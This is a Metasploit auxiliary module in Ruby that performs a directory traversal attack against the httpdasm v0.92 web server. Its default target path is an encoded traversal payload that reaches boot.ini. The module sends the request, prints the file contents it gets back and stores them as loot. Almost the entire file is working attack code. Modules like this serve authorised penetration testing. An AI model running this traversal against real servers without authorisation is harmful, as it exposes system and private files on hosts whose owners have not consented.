##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Httpdasm Directory Traversal',
      'Description'    => %q{
        This module allows for traversing the file system of a host running httpdasm v0.92.
      },
      'Author'         =>
        [
          'John Leitch', # EDB POC
          'Shelby Pace' # Metasploit Module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['EDB', '15861']
        ]
    ))

    register_options(
    [
      OptString.new('TARGETURI', [true, 'Path to traverse to', '%2e%2e%5c' * 8 + 'boot.ini'])
    ])

  end

  def run
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path)
    })

    if res && res.code == 200
      print_status(res.body)
      path = store_loot('httpdasm.file', 'application/octet-stream', rhost, res.body)
    else
      if res
        print_error("Unexpected response from server: #{res.code}")
      else
        print_error("The server timed out.")
      end
    end
  end
end
